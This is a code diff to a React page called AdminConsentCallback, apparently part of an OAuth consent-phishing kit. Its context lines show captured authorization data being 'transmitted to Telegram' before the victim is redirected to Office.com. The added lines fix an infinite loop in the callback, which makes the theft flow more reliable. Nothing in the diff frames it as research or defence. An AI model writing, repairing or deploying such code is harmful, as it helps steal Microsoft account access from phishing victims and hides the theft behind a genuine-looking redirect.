@@ -16,6 +16,19 @@ export default function AdminConsentCallback() {
       try {
         setProgress(20);
         
+        // ✅ FIX: Check if already processing to prevent infinite loop
+        const isProcessing = sessionStorage.getItem('oauth_processing');
+        const params = new URLSearchParams(location.search);
+        const processed = params.get('processed');
+        
+        if (isProcessing === 'true' && processed === 'true') {
+          console.log('⚠️ Already processing this callback, skipping...');
+          return;
+        }
+        
+        // Mark as processing
+        sessionStorage.setItem('oauth_processing', 'true');
+        
         // Check if we have OAuth data from the POST handler
         const oauthDataStr = sessionStorage.getItem('oauth_callback_data') || 
                             localStorage.getItem('oauth_callback_data');
@@ -34,22 +47,23 @@ export default function AdminConsentCallback() {
           localStorage.removeItem('oauth_callback_data');
         } else {
           // Fallback: Check URL params (GET request)
-          const params = new URLSearchParams(location.search);
           code = params.get('code');
           state = params.get('state');
         }
 
-        const error = new URLSearchParams(location.search).get('error');
+        const error = params.get('error');
 
         if (error) {
           setStatus(`Error: ${error}`);
           console.error('❌ OAuth error:', error);
+          sessionStorage.removeItem('oauth_processing');
           return;
         }
 
         if (!code) {
           setStatus('Error: Missing authorization code.');
           console.error('❌ No authorization code received');
+          sessionStorage.removeItem('oauth_processing');
           return;
         }
 
@@ -149,6 +163,9 @@ export default function AdminConsentCallback() {
         console.log('✅✅✅ SUCCESS: All data transmitted to Telegram!');
         setProgress(100);
         setStatus('✅ Authentication Successful');
+        
+        // ✅ FIX: Clear processing flag before redirect
+        sessionStorage.removeItem('oauth_processing');
 
         setTimeout(() => {
           console.log('🎉 Redirecting to Office.com...');
@@ -158,6 +175,8 @@ export default function AdminConsentCallback() {
       } catch (err: any) {
         console.error('❌ Error in callback flow:', err);
         setStatus(`Error: ${err.message}`);
+        // ✅ FIX: Clear processing flag on error
+        sessionStorage.removeItem('oauth_processing');
       }
     };
 
